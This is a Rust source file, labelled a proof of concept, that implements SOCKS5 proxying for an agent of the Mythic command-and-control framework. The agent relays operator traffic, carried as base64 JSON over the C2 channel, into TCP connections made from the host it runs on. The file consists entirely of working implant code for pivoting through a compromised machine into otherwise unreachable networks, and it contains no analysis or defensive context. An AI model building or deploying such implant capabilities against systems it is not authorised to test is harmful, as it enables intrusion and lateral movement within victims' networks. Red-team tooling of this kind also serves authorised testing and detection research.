// POC
use crate::mythic_continued;

use base64::{decode, encode};
use serde_json::{json, Value};

use std::collections::HashMap;
use std::error::Error;
use std::net::{Ipv4Addr, Ipv6Addr, SocketAddr};
use std::sync::mpsc as std_mpsc;

use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;
use tokio::sync::mpsc as tokio_mpsc;
use tokio::time::{timeout, Duration};

/* -------------------------- Debug helpers -------------------------- */

fn debug_to_mythic<T: Into<String>, U: Into<String>>(
    tx: &std_mpsc::Sender<Value>,
    task_id: &str,
    title: T,
    detail: U,
) {
    let _ = tx.send(mythic_continued!(task_id, title.into(), detail.into()));
}

fn hex_preview(data: &[u8], max: usize) -> String {
    use std::fmt::Write;
    let mut s = String::new();
    let take = data.len().min(max);
    for b in &data[..take] {
        let _ = write!(&mut s, "{:02x}", b);
    }
    if data.len() > max {
        s.push('…');
    }
    s
}

/* ------------------------------- SOCKS utils ------------------------------ */

fn build_reply(rep: u8, bound: Option<SocketAddr>) -> Vec<u8> {
    // VER=5, REP, RSV=0, ATYP, BND.ADDR, BND.PORT
    let mut out = vec![0x05, rep, 0x00];
    match bound {
        Some(SocketAddr::V4(v4)) => {
            out.push(0x01);
            out.extend_from_slice(&v4.ip().octets());
            out.extend_from_slice(&v4.port().to_be_bytes());
        }
        Some(SocketAddr::V6(v6)) => {
            out.push(0x04);
            out.extend_from_slice(&v6.ip().octets());
            out.extend_from_slice(&v6.port().to_be_bytes());
        }
        None => {
            out.push(0x01);
            out.extend_from_slice(&Ipv4Addr::UNSPECIFIED.octets());
            out.extend_from_slice(&0u16.to_be_bytes());
        }
    }
    out
}

#[inline]
fn send_socks_live( // *** live channel to Mythic's proxy ***
    tx: &std_mpsc::Sender<Value>,
    server_id: &str,
    data: &[u8],
    exit: bool,
) -> Result<(), Box<dyn Error>> {
    let sid_json = match server_id.parse::<u64>() {
        Ok(n) => json!(n),
        Err(_) => json!(server_id),
    };
    tx.send(json!({
        "action": "socks",
        "socks": [{
            "server_id": sid_json,
            "data": encode(data),
            "exit": exit
        }]
    }))?;
    Ok(())
}

#[inline]
fn send_exit_live(tx: &std_mpsc::Sender<Value>, server_id: &str) {
    let _ = send_socks_live(tx, server_id, &[], true);
}

/* --------------------------- CONNECT frame parsing ------------------------- */

fn parse_connect(decoded: &[u8]) -> Result<(String, u16), Box<dyn Error>> {
    if decoded.len() < 4 { return Err("SOCKS5 request too short".into()); }
    if decoded[0] != 0x05 { return Err("Unsupported SOCKS version".into()); }
    if decoded[1] != 0x01 { return Err("Not CONNECT (CMD!=0x01)".into()); }
    if decoded[2] != 0x00 { return Err("RSV must be 0x00".into()); }

    match decoded[3] {
        0x01 => {
            if decoded.len() < 10 { return Err("IPv4 CONNECT frame too short".into()); }
            let ip = Ipv4Addr::new(decoded[4], decoded[5], decoded[6], decoded[7]);
            let port = u16::from_be_bytes([decoded[8], decoded[9]]);
            Ok((ip.to_string(), port))
        }
        0x03 => {
            if decoded.len() < 5 { return Err("DOMAIN CONNECT no length".into()); }
            let len = decoded[4] as usize;
            if len == 0 || len > 255 { return Err("Bad domain length".into()); }
            let need = 5 + len + 2;
            if decoded.len() < need { return Err("DOMAIN CONNECT truncated".into()); }
            let domain = std::str::from_utf8(&decoded[5..5 + len])?.to_string();
            let port = u16::from_be_bytes([decoded[5 + len], decoded[6 + len]]);
            Ok((domain, port))
        }
        0x04 => {
            let need = 4 + 16 + 2;
            if decoded.len() < need { return Err("IPv6 CONNECT frame too short".into()); }
            let mut octets = [0u8; 16];
            octets.copy_from_slice(&decoded[4..20]);
            let ip = Ipv6Addr::from(octets);
            let port = u16::from_be_bytes([decoded[20], decoded[21]]);
            Ok((ip.to_string(), port))
        }
        _ => Err("Unsupported ATYP in CONNECT".into()),
    }
}

/* ------------------------- Helpers for inbound frames ---------------------- */

fn as_string_or_number(v: &Value) -> Option<String> {
    if let Some(s) = v.as_str() { return Some(s.to_string()); }
    if let Some(n) = v.as_u64() { return Some(n.to_string()); }
    if let Some(n) = v.as_i64() { return Some(n.to_string()); }
    None
}

fn normalize_socks_item(v: &Value) -> Option<Value> {
    let sid = v.get("server_id").and_then(as_string_or_number)?;
    let data = v.get("data")
        .or_else(|| v.get("chunk_data"))
        .and_then(|x| x.as_str())
        .unwrap_or("")
        .to_string();
    let exit = v.get("exit")
        .or_else(|| v.get("close"))
        .and_then(|x| x.as_bool())
        .unwrap_or(false);

    Some(json!({ "server_id": sid, "data": data, "exit": exit }))
}

/* ------------------------ Greeting detection (optional) -------------------- */

fn looks_like_greeting(buf: &[u8]) -> bool {
    // GREETING: VER=0x05, NMETHODS, then NMETHODS bytes.
    if buf.len() < 2 { return false; }
    if buf[0] != 0x05 { return false; }
    let n = buf[1] as usize;
    buf.len() >= 2 + n && buf.len() < 2 + n + 4 // heuristic: not long enough to be CONNECT
}

/* ------------------------------ Session logic ----------------------------- */

async fn run_session(
    parent_task_id: String,
    server_id: String,
    mut sess_rx: tokio_mpsc::UnboundedReceiver<Value>,
    tx_out: std_mpsc::Sender<Value>,
) -> Result<(), Box<dyn Error>> {
    debug_to_mythic(&tx_out, &parent_task_id, "socks.session.start", format!("sid={server_id}"));

    // Get first frame
    let first = match sess_rx.recv().await {
        Some(v) => v,
        None => {
            debug_to_mythic(&tx_out, &parent_task_id, "socks.session.abort", "no-initial-packet");
            return Ok(());
        }
    };

    let b64 = first["data"].as_str().unwrap_or("");
    let mut buf = match decode(b64) {
        Ok(d) => d,
        Err(e) => {
            debug_to_mythic(&tx_out, &parent_task_id, "socks.decode.fail",
                format!("sid={server_id}; err={e}; b64_len={}", b64.len()));
            // Send general failure on CONNECT path (if server expected CONNECT first)
            let _ = send_socks_live(&tx_out, &server_id, &build_reply(0x01, None), true);
            return Ok(());
        }
    };

    debug_to_mythic(&tx_out, &parent_task_id, "socks.first",
        format!("sid={server_id}; len={}; hex={}", buf.len(), hex_preview(&buf, 64)));

    // If server forwarded GREETING to agent, answer "no auth" and wait for CONNECT next.
    if looks_like_greeting(&buf) {
        let sel = [0x05u8, 0x00u8]; // VER=5, METHOD=0 (no auth)
        debug_to_mythic(&tx_out, &parent_task_id, "socks.greeting.seen", format!("sid={server_id}; replying 05 00"));
        let _ = send_socks_live(&tx_out, &server_id, &sel, false);

        // Now wait for CONNECT
        let nxt = match sess_rx.recv().await {
            Some(v) => v,
            None => {
                debug_to_mythic(&tx_out, &parent_task_id, "socks.session.abort", "no CONNECT after greeting");
                return Ok(());
            }
        };
        let b64 = nxt["data"].as_str().unwrap_or("");
        buf = match decode(b64) {
            Ok(d) => d,
            Err(e) => {
                debug_to_mythic(&tx_out, &parent_task_id, "socks.decode.fail2",
                    format!("sid={server_id}; err={e}; b64_len={}", b64.len()));
                let _ = send_socks_live(&tx_out, &server_id, &build_reply(0x01, None), true);
                return Ok(());
            }
        };
        debug_to_mythic(&tx_out, &parent_task_id, "socks.connect.req.after_greet",
            format!("sid={server_id}; len={}; hex={}", buf.len(), hex_preview(&buf, 64)));
    }

    // Now `buf` must be CONNECT
    let (addr, port) = match parse_connect(&buf) {
        Ok(v) => v,
        Err(e) => {
            debug_to_mythic(&tx_out, &parent_task_id, "socks.connect.parse_err",
                format!("sid={server_id}; err={e}; hex={}", hex_preview(&buf, 64)));
            let _ = send_socks_live(&tx_out, &server_id, &build_reply(0x07, None), true);
            return Ok(());
        }
    };

    debug_to_mythic(&tx_out, &parent_task_id, "socks.connect.try",
        format!("sid={server_id}; target={addr}:{port}"));

    let remote = match timeout(Duration::from_secs(15), TcpStream::connect((addr.as_str(), port))).await {
        Ok(Ok(s)) => s,
        Ok(Err(e)) => {
            let rep = if e.to_string().to_lowercase().contains("refused") { 0x05 }
                      else if e.to_string().to_lowercase().contains("unreachable") { 0x03 }
                      else { 0x01 };
            debug_to_mythic(&tx_out, &parent_task_id, "socks.connect.err",
                format!("sid={server_id}; rep=0x{rep:02x}; err={e}"));
            let _ = send_socks_live(&tx_out, &server_id, &build_reply(rep, None), true);
            return Ok(());
        }
        Err(_) => {
            debug_to_mythic(&tx_out, &parent_task_id, "socks.connect.timeout",
                format!("sid={server_id}; target={addr}:{port}"));
            let _ = send_socks_live(&tx_out, &server_id, &build_reply(0x01, None), true);
            return Ok(());
        }
    };

    let bound_dbg = remote.local_addr().ok().map(|s| s.to_string()).unwrap_or_else(|| "unknown".into());
    let ok = build_reply(0x00, None);
    let _ = send_socks_live(&tx_out, &server_id, &ok, false);
    debug_to_mythic(&tx_out, &parent_task_id, "socks.connect.ok",
        format!("sid={server_id}; bound={bound_dbg}; reply_hex={}", hex_preview(&ok, 22)));

    let (mut r_r, mut r_w) = remote.into_split();

    // ---- A2M: remote -> Mythic ----
    let tx_up = tx_out.clone();
    let sid_up = server_id.clone();
    let parent_up = parent_task_id.clone();
    let a2m = tokio::spawn(async move {
        let mut buf = vec![0u8; 16 * 1024];
        let mut total: u64 = 0;
        loop {
            match timeout(Duration::from_secs(300), r_r.read(&mut buf)).await {
                Ok(Ok(0)) => {
                    debug_to_mythic(&tx_up, &parent_up, "socks.a2m.eof", format!("sid={sid_up}; total={total}"));
                    send_exit_live(&tx_up, &sid_up);
                    break;
                }
                Ok(Ok(n)) => {
                    if n > 0 {
                        total += n as u64;
                        let _ = send_socks_live(&tx_up, &sid_up, &buf[..n], false);
                        if total % (64 * 1024) == 0 {
                            debug_to_mythic(&tx_up, &parent_up, "socks.a2m.progress", format!("sid={sid_up}; sent_up={total}"));
                        }
                    }
                }
                Ok(Err(e)) => {
                    debug_to_mythic(&tx_up, &parent_up, "socks.a2m.read_err", format!("sid={sid_up}; err={e}; sent_up={total}"));
                    send_exit_live(&tx_up, &sid_up);
                    break;
                }
                Err(_) => {
                    debug_to_mythic(&tx_up, &parent_up, "socks.a2m.idle_timeout", format!("sid={sid_up}; sent_up={total}"));
                    send_exit_live(&tx_up, &sid_up);
                    break;
                }
            }
        }
    });

    // ---- M2A: Mythic -> remote ----
    let tx_dn = tx_out.clone();
    let sid_dn = server_id.clone();
    let parent_dn = parent_task_id.clone();
    let m2a = tokio::spawn(async move {
        let mut total: u64 = 0;
        while let Some(pkt) = sess_rx.recv().await {
            let exit = pkt.get("exit").and_then(|v| v.as_bool()).unwrap_or(false);
            if exit {
                debug_to_mythic(&tx_dn, &parent_dn, "socks.m2a.exit", format!("sid={sid_dn}; total_written={total}"));
                let _ = r_w.shutdown().await;
                break;
            }
            let data_b64 = pkt.get("data").and_then(|v| v.as_str()).unwrap_or("");
            match decode(data_b64) {
                Ok(bytes) => {
                    if bytes.is_empty() { continue; }
                    total += bytes.len() as u64;
                    let _ = timeout(Duration::from_secs(60), r_w.write_all(&bytes)).await;
                    if total % (64 * 1024) == 0 {
                        debug_to_mythic(&tx_dn, &parent_dn, "socks.m2a.progress", format!("sid={sid_dn}; wrote_down={total}"));
                    }
                }
                Err(e) => {
                    debug_to_mythic(&tx_dn, &parent_dn, "socks.m2a.b64_err", format!("sid={sid_dn}; err={e}; total_written={total}"));
                }
            }
        }
        let _ = r_w.shutdown().await;
    });

    let _ = a2m.await;
    let _ = m2a.await;

    debug_to_mythic(&tx_out, &parent_task_id, "socks.session.end", format!("sid={server_id}"));
    Ok(())
}

/* --------------------------------- Entry ---------------------------------- */

pub fn handle_socks(
    tx: &std_mpsc::Sender<Value>,
    rx: std_mpsc::Receiver<Value>,
) -> Result<(), Box<dyn Error>> {
    // First message should be the AgentTask envelope (blocking)
    let task_val = rx.recv()?;
    let task: AgentTask = serde_json::from_value(task_val)?;
    debug_to_mythic(tx, &task.id, "socks.handler.start", "dispatcher starting");

    // Bridge std::mpsc -> tokio::mpsc
    let (bridge_tx, mut bridge_rx) = tokio_mpsc::unbounded_channel::<Value>();
    {
        let parent_id = task.id.clone();
        let tx_dbg = tx.clone();
        std::thread::spawn(move || {
            debug_to_mythic(&tx_dbg, &parent_id, "socks.bridge.spawn", "blocking→async started");
            while let Ok(v) = rx.recv() {
                debug_to_mythic(&tx_dbg, &parent_id, "socks.bridge.rx", format!("{}", v).chars().take(300).collect::<String>());

                if let Some(arr) = v.get("socks").and_then(|x| x.as_array()) {
                    for it in arr {
                        if let Some(n) = normalize_socks_item(it) { let _ = bridge_tx.send(n); }
                    }
                    continue;
                }

                if v.get("server_id").is_some()
                    && (v.get("data").is_some() || v.get("chunk_data").is_some())
                {
                    if let Some(n) = normalize_socks_item(&v) { let _ = bridge_tx.send(n); }
                    continue;
                }

                if let Some(params_val) = v.get("parameters") {
                    let inner: Value = match params_val {
                        Value::String(s) => serde_json::from_str::<Value>(s).unwrap_or(Value::Null),
                        v @ Value::Object(_) => v.clone(),
                        _ => Value::Null,
                    };

                    if let Some(arr) = inner.get("socks").and_then(|x| x.as_array()) {
                        for it in arr {
                            if let Some(n) = normalize_socks_item(it) { let _ = bridge_tx.send(n); }
                        }
                        continue;
                    }
                    if inner.get("server_id").is_some()
                        && (inner.get("data").is_some() || inner.get("chunk_data").is_some())
                    {
                        if let Some(n) = normalize_socks_item(&inner) { let _ = bridge_tx.send(n); }
                        continue;
                    }
                }
                debug_to_mythic(&tx_dbg, &parent_id, "socks.bridge.unmatched", "ignored message");
            }
            debug_to_mythic(&tx_dbg, &parent_id, "socks.bridge.end", "blocking receiver closed");
        });
    }

    let rt = tokio::runtime::Runtime::new()?;
    rt.block_on(async {
        let mut sessions: HashMap<String, tokio_mpsc::UnboundedSender<Value>> = HashMap::new();
        let parent_task_id = task.id.clone();
        let mut seen: u64 = 0;

        debug_to_mythic(tx, &parent_task_id, "socks.dispatcher.run", "awaiting items");

        while let Some(item) = bridge_rx.recv().await {
            seen += 1;

            let sid = item["server_id"].as_str().unwrap_or("").to_string();
            let exit = item["exit"].as_bool().unwrap_or(false);
            let data_len_b64 = item["data"].as_str().map(|s| s.len()).unwrap_or(0);

            if seen <= 5 || seen % 100 == 0 {
                debug_to_mythic(tx, &parent_task_id, "socks.dispatcher.item",
                    format!("count={seen}; sid={sid}; exit={exit}; data_b64_len={data_len_b64}"));
            }

            let entry = sessions.entry(sid.clone()).or_insert_with(|| {
                let (sess_tx, sess_rx) = tokio_mpsc::unbounded_channel::<Value>();
                let tx_out = tx.clone();
                let parent_id = parent_task_id.clone();
                let sid_clone = sid.clone();

                debug_to_mythic(&tx_out, &parent_id, "socks.session.spawn", format!("sid={sid_clone}"));
                tokio::spawn(async move {
                    let _ = run_session(parent_id, sid_clone, sess_rx, tx_out).await;
                });
                sess_tx
            });

            if entry.send(item.clone()).is_err() {
                sessions.remove(&sid);
                debug_to_mythic(tx, &parent_task_id, "socks.dispatcher.drop_dead", format!("sid={sid}"));
            }

            if exit {
                sessions.remove(&sid);
                debug_to_mythic(tx, &parent_task_id, "socks.dispatcher.exit", format!("sid={sid}"));
            }
        }

        debug_to_mythic(tx, &parent_task_id, "socks.dispatcher.end", "bridge closed");
        sessions.clear();
    });

    Ok(())
}

pub fn setup_socks(
    tx: &std_mpsc::Sender<Value>,
    rx: std_mpsc::Receiver<Value>,
) -> Result<(), Box<dyn Error>> {
    handle_socks(tx, rx)
}
